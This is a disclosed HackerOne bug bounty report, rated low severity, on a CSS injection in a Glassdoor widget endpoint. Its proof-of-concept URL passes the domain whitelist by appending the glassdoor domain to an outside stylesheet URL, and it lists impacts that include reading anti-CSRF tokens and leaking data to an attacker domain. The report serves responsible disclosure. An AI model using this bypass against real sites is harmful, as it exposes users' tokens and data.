# CSS injection via link tag whitelisted-domain bypass - https://www.glassdoor.com

## Report Details
- **Report ID**: 1250730
- **URL**: https://hackerone.com/reports/1250730
- **State**: Closed
- **Severity**: low
- **Submitted**: 2021-07-03T17:36:27.183Z
- **Disclosed**: 2021-12-02T17:17:48.058Z

## Reporter
- **Username**: zonduu
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: glassdoor

## Vulnerability Information
## Summary:

It is possible load an arbitrary .css file. Bypassing the protections by adding the domain `https://www.glassdoor.com` in a parameter/path.

### Affected URL or select Asset from In-Scope: 

- https://www.glassdoor.com/api/widget/apiError.htm?action=employer-single-review&css=https://zonduu.me/example.css?http://www.glassdoor.com/&format=320x280&responsetype=embed&reviewid=3762318&version=1&format=320x280&responsetype=embed&reviewid=3762318&version=1

### Affected Parameter:

- css

### Browsers tested:

- All

## Steps To Reproduce:

- https://www.glassdoor.com/api/widget/apiError.htm?action=employer-single-review&css=https://zonduu.me/example.css?http://www.glassdoor.com/&format=320x280&responsetype=embed&reviewid=3762318&version=1&format=320x280&responsetype=embed&reviewid=3762318&version=1

It will inject `https://zonduu.me/example.css?http://www.glassdoor.com/` in the href of the second link tag.

```html
<link href='https://zonduu.me/example.css?http://www.glassdoor.com/' rel='stylesheet' type='text/css' media='all' />
```

`www.glassdoor.com` needs to be in input otherwise the server rejects it.

## Impact Description:

## Impact

- Executing arbitrary JavaScript using IE's expression() function.
- Using CSS selectors to read parts of the HTML source, which may include sensitive data such as anti-CSRF tokens.
- Capturing any sensitive data within the URL query string by making a further style sheet import to a URL on the attacker's domain, and monitoring the incoming Referer header.

## Attachments
No attachments
